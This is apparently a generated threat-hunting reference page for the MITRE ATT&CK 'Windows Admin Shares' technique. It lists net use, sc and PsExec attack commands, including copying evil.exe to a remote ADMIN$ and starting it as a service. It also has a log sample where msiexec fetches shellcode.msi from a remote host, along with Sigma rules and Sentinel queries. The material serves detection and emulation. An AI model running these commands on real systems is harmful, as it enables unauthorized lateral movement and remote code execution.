
# Windows Admin Shares

## Description

### MITRE Description

> Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. 

Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares)

The [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials. (Citation: Technet Net Use)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Administrator']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1077

## Potential Commands

```
net use [\\ip\path] [password] [/user:DOMAIN\user]
net use \\COMP\ADMIN$ password /user:COMP\Administrator (checking password reuse on local admin account)
shell net use [\\ip\path] [password] [/user:DOMAIN\user]
Creating a new service remotely:
net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
sc \\COMP start acachsrv
Creating a new service remotely:
shell net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
shell sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
shell sc \\COMP start acachsrv
cmd.exe /c "net use \\#{computer_name}\C$ #{password} /u:#{user_name}"

cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:DOMAIN\Administrator"

cmd.exe /c "net use \\#{computer_name}\#{share_name} P@ssw0rd1 /u:#{user_name}"

cmd.exe /c "net use \\Target\#{share_name} #{password} /u:#{user_name}"

New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\C$

New-PSDrive -name #{map_name} -psprovider filesystem -root \\Target\#{share_name}

New-PSDrive -name g -psprovider filesystem -root \\#{computer_name}\#{share_name}

psexec.exe \\localhost -c #{command_path}

psexec.exe #{remote_host} -c C:\Windows\System32\cmd.exe

cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\output.txt 2>&1

cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1

{'windows': {'psh': {'command': 'net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n', 'cleanup': 'net use \\\\#{remote.host.ip}\\c$ /delete;\n'}}}
{'windows': {'psh': {'command': 'net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n', 'cleanup': 'net use \\\\#{remote.host.fqdn}\\C$ /delete\n', 'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'source': 'remote.host.fqdn', 'edge': 'has_share'}]}}}}
Log
windows security log
EventID: 4688
Process information:
New Process ID: 0xe84
New Process Name: C: \ Users \ 12306Br0 \ Desktop \ PSTools \ PsExec.exe

EventID: 4688
Process information:
New Process ID: 0xfcc
New Process Name: C: \ Windows \ PSEXESVC.exe

EVentID: 5140
Internet Information:
Object Type: File
Source Address: fe80 :: 719e: d312: 648f: 4884
Source Port: 49369
Share information:
Share name: \\ * \ IPC $

EventID: 5145
Internet Information:
Object Type: File
Source Address: fe80 :: 719e: d312: 648f: 4884
Source Port: 49369

Share information:
Share Name: \\ * \ IPC $
Share path:
Relative Target Name: PSEXESVC

SYSMON log
EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.237
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}
ProcessId: 3716
Image: C: \ Users \ 12306Br0 \ Desktop \ PSTools \ PsExec.exe
FileVersion: 2.2
Description: Execute processes remotely
Product: Sysinternals PsExec
Company: Sysinternals - www.sysinternals.com
OriginalFileName: psexec.c
CommandLine: PsExec.exe -d -s msiexec.exe / q / i http://192.168.126.146/shellcode.msi
CurrentDirectory: C: \ Users \ 12306Br0 \ Desktop \ PSTools \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095
ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}
ParentProcessId: 3492
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ System32 \ cmd.exe"

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.284
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ProcessId: 4044
Image: C: \ Windows \ PSEXESVC.exe
FileVersion: 2.2
Description: PsExec Service
Product: Sysinternals PsExec
Company: Sysinternals
OriginalFileName: psexesvc.exe
CommandLine: C: \ Windows \ PSEXESVC.exe
CurrentDirectory: C: \ Windows \ system32 \
User: NT AUTHORITY \ SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7
ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}
ParentProcessId: 496
ParentImage: C: \ Windows \ System32 \ services.exe
ParentCommandLine: C: \ Windows \ system32 \ services.exe

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 15: 09: 29.440
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}
ProcessId: 1916
Image: C: \ Windows \ System32 \ msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: "msiexec.exe" / q / i http://192.168.126.146/shellcode.msi
CurrentDirectory: C: \ Windows \ system32 \
User: NT AUTHORITY \ SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ParentProcessId: 4044
ParentImage: C: \ Windows \ PSEXESVC.exe
ParentCommandLine: C: \ Windows \ PSEXESVC.exe
```

## Commands Dataset

```
[{'command': 'net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\n'
             'net use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator '
             '(checking password reuse on local admin account)',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'net use \\\\COMP\\ADMIN$ "password" /user:DOMAIN_NAME\\UserName\n'
             'copy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
             'sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto  DisplayName= '
             '"DisplayName"\n'
             'sc \\\\COMP start acachsrv',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'shell net use \\\\COMP\\ADMIN$ "password" '
             '/user:DOMAIN_NAME\\UserName\n'
             'shell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\n'
             'shell sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto description= '
             '"Description here" DisplayName= "DisplayName"\n'
             'shell sc \\\\COMP start acachsrv',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'cmd.exe /c "net use \\\\#{computer_name}\\C$ #{password} '
             '/u:#{user_name}"\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'cmd.exe /c "net use \\\\#{computer_name}\\#{share_name} '
             '#{password} /u:DOMAIN\\Administrator"\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'cmd.exe /c "net use \\\\#{computer_name}\\#{share_name} '
             'P@ssw0rd1 /u:#{user_name}"\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'cmd.exe /c "net use \\\\Target\\#{share_name} #{password} '
             '/u:#{user_name}"\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'New-PSDrive -name #{map_name} -psprovider filesystem -root '
             '\\\\#{computer_name}\\C$\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'New-PSDrive -name #{map_name} -psprovider filesystem -root '
             '\\\\Target\\#{share_name}\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'New-PSDrive -name g -psprovider filesystem -root '
             '\\\\#{computer_name}\\#{share_name}\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'psexec.exe \\\\localhost -c #{command_path}\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'psexec.exe #{remote_host} -c C:\\Windows\\System32\\cmd.exe\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'cmd.exe /Q /c #{command_to_execute} 1> '
             '\\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': 'cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} '
             '2>&1\n',
  'name': None,
  'source': 'atomics/T1077/T1077.yaml'},
 {'command': {'windows': {'psh': {'cleanup': 'net use '
                                             '\\\\#{remote.host.ip}\\c$ '
                                             '/delete;\n',
                                  'command': 'net use '
                                             '\\\\#{remote.host.ip}\\c$ '
                                             '/user:#{domain.user.name} '
                                             '#{domain.user.password};\n'}}},
  'name': 'Mounts a network file share on a target computer',
  'source': 'data/abilities/lateral-movement/40161ad0-75bd-11e9-b475-0800200c9a66.yml'},
 {'command': {'windows': {'psh': {'cleanup': 'net use '
                                             '\\\\#{remote.host.fqdn}\\C$ '
                                             '/delete\n',
                                  'command': 'net use '
                                             '\\\\#{remote.host.fqdn}\\C$ '
                                             '/user:#{network.domain.name}\\#{domain.user.name} '
                                             '#{domain.user.password}\n',
                                  'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'edge': 'has_share',
                                                                                               'source': 'remote.host.fqdn'}]}}}},
  'name': 'Mount a windows share',
  'source': 'data/abilities/lateral-movement/aa6ec4dd-db09-4925-b9b9-43adeb154686.yml'},
 {'command': 'Log\n'
             'windows security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xe84\n'
             'New Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools '
             '\\ PsExec.exe\n'
             '\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xfcc\n'
             'New Process Name: C: \\ Windows \\ PSEXESVC.exe\n'
             '\n'
             'EVentID: 5140\n'
             'Internet Information:\n'
             'Object Type: File\n'
             'Source Address: fe80 :: 719e: d312: 648f: 4884\n'
             'Source Port: 49369\n'
             'Share information:\n'
             'Share name: \\\\ * \\ IPC $\n'
             '\n'
             'EventID: 5145\n'
             'Internet Information:\n'
             'Object Type: File\n'
             'Source Address: fe80 :: 719e: d312: 648f: 4884\n'
             'Source Port: 49369\n'
             '\n'
             'Share information:\n'
             'Share Name: \\\\ * \\ IPC $\n'
             'Share path:\n'
             'Relative Target Name: PSEXESVC\n'
             '\n'
             'SYSMON log\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.237\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}\n'
             'ProcessId: 3716\n'
             'Image: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools \\ '
             'PsExec.exe\n'
             'FileVersion: 2.2\n'
             'Description: Execute processes remotely\n'
             'Product: Sysinternals PsExec\n'
             'Company: Sysinternals - www.sysinternals.com\n'
             'OriginalFileName: psexec.c\n'
             'CommandLine: PsExec.exe -d -s msiexec.exe / q / i '
             'http://192.168.126.146/shellcode.msi\n'
             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\ Desktop \\ PSTools '
             '\\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\n'
             'LogonId: 0x6e1ea\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: High\n'
             'Hashes: SHA1 = E50D9E3BD91908E13A26B3E23EDEAF577FB3A095\n'
             'ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}\n'
             'ParentProcessId: 3492\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ System32 \\ cmd.exe"\n'
             '\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.284\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\n'
             'ProcessId: 4044\n'
             'Image: C: \\ Windows \\ PSEXESVC.exe\n'
             'FileVersion: 2.2\n'
             'Description: PsExec Service\n'
             'Product: Sysinternals PsExec\n'
             'Company: Sysinternals\n'
             'OriginalFileName: psexesvc.exe\n'
             'CommandLine: C: \\ Windows \\ PSEXESVC.exe\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: NT AUTHORITY \\ SYSTEM\n'
             'LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\n'
             'LogonId: 0x3e7\n'
             'TerminalSessionId: 0\n'
             'IntegrityLevel: System\n'
             'Hashes: SHA1 = A17C21B909C56D93D978014E63FB06926EAEA8E7\n'
             'ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}\n'
             'ParentProcessId: 496\n'
             'ParentImage: C: \\ Windows \\ System32 \\ services.exe\n'
             'ParentCommandLine: C: \\ Windows \\ system32 \\ services.exe\n'
             '\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 15: 09: 29.440\n'
             'ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}\n'
             'ProcessId: 1916\n'
             'Image: C: \\ Windows \\ System32 \\ msiexec.exe\n'
             'FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\n'
             'Description: Windows installer\n'
             'Product: Windows Installer - Unicode\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: msiexec.exe\n'
             'CommandLine: "msiexec.exe" / q / i '
             'http://192.168.126.146/shellcode.msi\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: NT AUTHORITY \\ SYSTEM\n'
             'LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\n'
             'LogonId: 0x3e7\n'
             'TerminalSessionId: 0\n'
             'IntegrityLevel: System\n'
             'Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\n'
             'ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\n'
             'ParentProcessId: 4044\n'
             'ParentImage: C: \\ Windows \\ PSEXESVC.exe\n'
             'ParentCommandLine: C: \\ Windows \\ PSEXESVC.exe',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'description': 'Detects access to $ADMIN share',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'SubjectUserName': '*$'},
                                'selection': {'EventID': 5140,
                                              'ShareName': 'Admin$'}},
                  'falsepositives': ['Legitimate administrative activity'],
                  'id': '098d7118-55bc-4912-a836-dc6483a8d150',
                  'level': 'low',
                  'logsource': {'definition': 'The advanced audit policy '
                                              'setting "Object Access > Audit '
                                              'File Share" must be configured '
                                              'for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'status': 'experimental',
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'Access to ADMIN$ Share'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'This detection excludes known namped pipes '
                                 'accessible remotely and notify on newly '
                                 'observed ones, may help to detect lateral '
                                 'movement and remote exec using named pipes',
                  'detection': {'condition': 'selection1 and not selection2',
                                'selection1': {'EventID': 5145,
                                               'ShareName': '\\\\*\\IPC$'},
                                'selection2': {'EventID': 5145,
                                               'RelativeTargetName': ['atsvc',
                                                                      'samr',
                                                                      'lsarpc',
                                                                      'winreg',
                                                                      'netlogon',
                                                                      'srvsvc',
                                                                      'protected_storage',
                                                                      'wkssvc',
                                                                      'browser',
                                                                      'netdfs'],
                                               'ShareName': '\\\\*\\IPC$'}},
                  'falsepositives': ['update the excluded named pipe to filter '
                                     'out any newly observed legit named pipe'],
                  'id': '52d8b0c6-53d6-439a-9e41-52ad442ad9ad',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://twitter.com/menasec1/status/1104489274387451904'],
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'First time seen remote named pipe'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'detects execution of psexec or paexec with '
                                 'renamed service name, this rule helps to '
                                 'filter out the noise if psexec is used for '
                                 'legit purposes or if attacker uses a '
                                 'different psexec client other than '
                                 'sysinternal one',
                  'detection': {'condition': 'selection1 and not selection2',
                                'selection1': {'EventID': 5145,
                                               'RelativeTargetName': ['*-stdin',
                                                                      '*-stdout',
                                                                      '*-stderr'],
                                               'ShareName': '\\\\*\\IPC$'},
                                'selection2': {'EventID': 5145,
                                               'RelativeTargetName': 'PSEXESVC*',
                                               'ShareName': '\\\\*\\IPC$'}},
                  'falsepositives': ['nothing observed so far'],
                  'id': 'c462f537-a1e3-41a6-b5fc-b2c2cef9bf82',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html'],
                  'tags': ['attack.lateral_movement', 'attack.t1077'],
                  'title': 'Suspicious PsExec execution'}}]
```

## Potential Queries

```json
[{'name': 'Windows Admin Shares',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3 and process_path contains "net.exe"and '
           '(process_command_line contains "use"or process_command_line '
           'contains "session"or process_command_line contains "file")'},
 {'name': 'Windows Admin Shares Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path contains "net.exe"or '
           'process_path contains "powershell.exe")and ((process_command_line '
           'contains "*net* use*$"or process_command_line contains "*net* '
           'session*$"or process_command_line contains "*net* file*$")or '
           'process_command_line contains "*New-PSDrive*root*")'},
 {'name': 'Windows Admin Shares Process Created',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and process_path contains "net.exe"and '
           'process_command_line contains "net share"'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'net '
                                                                              'use '
                                                                              '[\\\\ip\\path] '
                                                                              '[password] '
                                                                              '[/user:DOMAIN\\user]\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              'password '
                                                                              '/user:COMP\\Administrator '
                                                                              '(checking '
                                                                              'password '
                                                                              'reuse '
                                                                              'on '
                                                                              'local '
                                                                              'admin '
                                                                              'account)',
                                                  'Category': 'T1077',
                                                  'Cobalt Strike': 'shell net '
                                                                   'use '
                                                                   '[\\\\ip\\path] '
                                                                   '[password] '
                                                                   '[/user:DOMAIN\\user]',
                                                  'Description': 'Used to view '
                                                                 'network '
                                                                 'shared '
                                                                 'resource '
                                                                 'information, '
                                                                 'add a new '
                                                                 'network '
                                                                 'resource, '
                                                                 'and remove '
                                                                 'an old '
                                                                 'network '
                                                                 'resource '
                                                                 'from the '
                                                                 'computer. '
                                                                 'Run this '
                                                                 'against '
                                                                 'computers '
                                                                 'discovered '
                                                                 'from the '
                                                                 'previous two '
                                                                 'commands to '
                                                                 'view the '
                                                                 'shares that '
                                                                 'are '
                                                                 'available on '
                                                                 'them.',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Creating '
                                                                              'a '
                                                                              'new '
                                                                              'service '
                                                                              'remotely:\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              '"password" '
                                                                              '/user:DOMAIN_NAME\\UserName\n'
                                                                              'copy '
                                                                              'evil.exe '
                                                                              '\\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'create '
                                                                              'acachsrv '
                                                                              'binPath= '
                                                                              '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                              'start= '
                                                                              'auto  '
                                                                              'DisplayName= '
                                                                              '"DisplayName"\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'start '
                                                                              'acachsrv',
                                                  'Category': 'T1077',
                                                  'Cobalt Strike': 'Creating a '
                                                                   'new '
                                                                   'service '
                                                                   'remotely:\n'
                                                                   'shell net '
                                                                   'use '
                                                                   '\\\\COMP\\ADMIN$ '
                                                                   '"password" '
                                                                   '/user:DOMAIN_NAME\\UserName\n'
                                                                   'shell copy '
                                                                   'evil.exe '
                                                                   '\\\\COMP\\ADMIN$\\acachsrv.exe\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'create '
                                                                   'acachsrv '
                                                                   'binPath= '
                                                                   '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                   'start= '
                                                                   'auto '
                                                                   'description= '
                                                                   '"Description '
                                                                   'here" '
                                                                   'DisplayName= '
                                                                   '"DisplayName"\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'start '
                                                                   'acachsrv',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'creates a '
                                                                 'new service '
                                                                 'on the '
                                                                 'remote '
                                                                 'machine. '
                                                                 "It's "
                                                                 'important to '
                                                                 'note the '
                                                                 'spaces after '
                                                                 'the = in '
                                                                 'these '
                                                                 'commands! '
                                                                 'Also, before '
                                                                 'starting the '
                                                                 'service, run '
                                                                 'the '
                                                                 'following '
                                                                 'commands to '
                                                                 'make sure '
                                                                 'everything '
                                                                 'is set up '
                                                                 'properly:\n'
                                                                 'sc \\\\COMP '
                                                                 'qc acachsrv\n'
                                                                 'dir '
                                                                 '\\\\COMP\\ADMIN$\\acachsrv.exe',
                                                  'Metasploit': ''}},
 {'Atomic Red Team Test - Windows Admin Shares': {'atomic_tests': [{'description': 'Connecting '
                                                                                   'To '
                                                                                   'Remote '
                                                                                   'Shares\n',
                                                                    'executor': {'command': 'cmd.exe '
                                                                                            '/c '
                                                                                            '"net '
                                                                                            'use '
                                                                                            '\\\\#{computer_name}\\#{share_name} '
                                                                                            '#{password} '
                                                                                            '/u:#{user_name}"\n',
                                                                                 'elevation_required': False,
                                                                                 'name': 'command_prompt'},
                                                                    'input_arguments': {'computer_name': {'default': 'Target',
                                                                                                          'description': 'Target '
                                                                                                                         'Computer '
                                                                                                                         'Name',
                                                                                                          'type': 'String'},
                                                                                        'password': {'default': 'P@ssw0rd1',
                                                                                                     'description': 'Password',
                                                                                                     'type': 'String'},
                                                                                        'share_name': {'default': 'C$',
                                                                                                       'description': 'Examples '
                                                                                                                      'C$, '
                                                                                                                      'IPC$, '
                                                                                                                      'Admin$',
                                                                                                       'type': 'String'},
                                                                                        'user_name': {'default': 'DOMAIN\\Administrator',
                                                                                                      'description': 'Username',
                                                                                                      'type': 'String'}},
                                                                    'name': 'Map '
                                                                            'admin '
                                                                            'share',
                                                                    'supported_platforms': ['windows']},
                                                                   {'description': 'Map '
                                                                                   'Admin '
                                                                                   'share '
                                                                                   'utilizing '
                                                                                   'PowerShell\n',
                                                                    'executor': {'command': 'New-PSDrive '
                                                                                            '-name '
                                                                                            '#{map_name} '
                                                                                            '-psprovider '
                                                                                            'filesystem '
                                                                                            '-root '
                                                                                            '\\\\#{computer_name}\\#{share_name}\n',
                                                                                 'elevation_required': False,
                                                                                 'name': 'powershell'},
                                                                    'input_arguments': {'computer_name': {'default': 'Target',
                                                                                                          'description': 'Target '
                                                                                                                         'Computer '
                                                                                                                         'Name',
                                                                                                          'type': 'String'},
                                                                                        'map_name': {'default': 'g',
                                                                                                     'description': 'Mapped '
                                                                                                                    'Drive '
                                                                                                                    'Letter',
                                                                                                     'type': 'String'},
                                                                                        'share_name': {'default': 'C$',
                                                                                                       'description': 'Examples '
                                                                                                                      'C$, '
                                                                                                                      'IPC$, '
                                                                                                                      'Admin$',
                                                                                                       'type': 'String'}},
                                                                    'name': 'Map '
                                                                            'Admin '
                                                                            'Share '
                                                                            'PowerShell',
                                                                    'supported_platforms': ['windows']},
                                                                   {'description': 'Copies '
                                                                                   'a '
                                                                                   'file '
                                                                                   'to '
                                                                                   'a '
                                                                                   'remote '
                                                                                   'host '
                                                                                   'and '
                                                                                   'executes '
                                                                                   'it '
                                                                                   'using '
                                                                                   'PsExec. '
                                                                                   'Requires '
                                                                                   'the '
                                                                                   'download '
                                                                                   'of '
                                                                                   'PsExec '
                                                                                   'from '
                                                                                   '[https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n',
                                                                    'executor': {'command': 'psexec.exe '
                                                                                            '#{remote_host} '
                                                                                            '-c '
                                                                                            '#{command_path}\n',
                                                                                 'elevation_required': True,
                                                                                 'name': 'command_prompt'},
                                                                    'input_arguments': {'command_path': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                         'description': 'File '
                                                                                                                        'to '
                                                                                                                        'copy '
                                                                                                                        'and '
                                                                                                                        'execute',
                                                                                                         'type': 'Path'},
                                                                                        'remote_host': {'default': '\\\\localhost',
                                                                                                        'description': 'Remote '
                                                                                                                       'computer '
                                                                                                                       'to '
                                                                                                                       'receive '
                                                                                                                       'the '
                                                                                                                       'copy '
                                                                                                                       'and '
                                                                                                                       'execute '
                                                                                                                       'the '
                                                                                                                       'file',
                                                                                                        'type': 'String'}},
                                                                    'name': 'Copy '
                                                                            'and '
                                                                            'Execute '
                                                                            'File '
                                                                            'with '
                                                                            'PsExec',
                                                                    'supported_platforms': ['windows']},
                                                                   {'description': 'Executes '
                                                                                   'a '
                                                                                   'command, '
                                                                                   'writing '
                                                                                   'the '
                                                                                   'output '
                                                                                   'to '
                                                                                   'a '
                                                                                   'local '
                                                                                   'Admin '
                                                                                   'Share.\n'
                                                                                   'This '
                                                                                   'technique '
                                                                                   'is '
                                                                                   'used '
                                                                                   'by '
                                                                                   'post-exploitation '
                                                                                   'frameworks.\n',
                                                                    'executor': {'command': 'cmd.exe '
                                                                                            '/Q '
                                                                                            '/c '
                                                                                            '#{command_to_execute} '
                                                                                            '1> '
                                                                                            '\\\\127.0.0.1\\ADMIN$\\#{output_file} '
                                                                                            '2>&1\n',
                                                                                 'elevation_required': True,
                                                                                 'name': 'command_prompt'},
                                                                    'input_arguments': {'command_to_execute': {'default': 'hostname',
                                                                                                               'description': 'Command '
                                                                                                                              'to '
                                                                                                                              'execute '
                                                                                                                              'for '
                                                                                                                              'output.',
                                                                                                               'type': 'String'},
                                                                                        'output_file': {'default': 'output.txt',
                                                                                                        'description': 'Remote '
                                                                                                                       'computer '
                                                                                                                       'to '
                                                                                                                       'receive '
                                                                                                                       'the '
                                                                                                                       'copy '
                                                                                                                       'and '
                                                                                                                       'execute '
                                                                                                                       'the '
                                                                                                                       'file',
                                                                                                        'type': 'String'}},
                                                                    'name': 'Execute '
                                                                            'command '
                                                                            'writing '
                                                                            'output '
                                                                            'to '
                                                                            'local '
                                                                            'Admin '
                                                                            'Share',
                                                                    'supported_platforms': ['windows']}],
                                                  'attack_technique': 'T1077',
                                                  'display_name': 'Windows '
                                                                  'Admin '
                                                                  'Shares'}},
 {'Mitre Stockpile - Mounts a network file share on a target computer': {'description': 'Mounts '
                                                                                        'a '
                                                                                        'network '
                                                                                        'file '
                                                                                        'share '
                                                                                        'on '
                                                                                        'a '
                                                                                        'target '
                                                                                        'computer',
                                                                         'id': '40161ad0-75bd-11e9-b475-0800200c9a66',
                                                                         'name': 'Net '
                                                                                 'use',
                                                                         'platforms': {'windows': {'psh': {'cleanup': 'net '
                                                                                                                      'use '
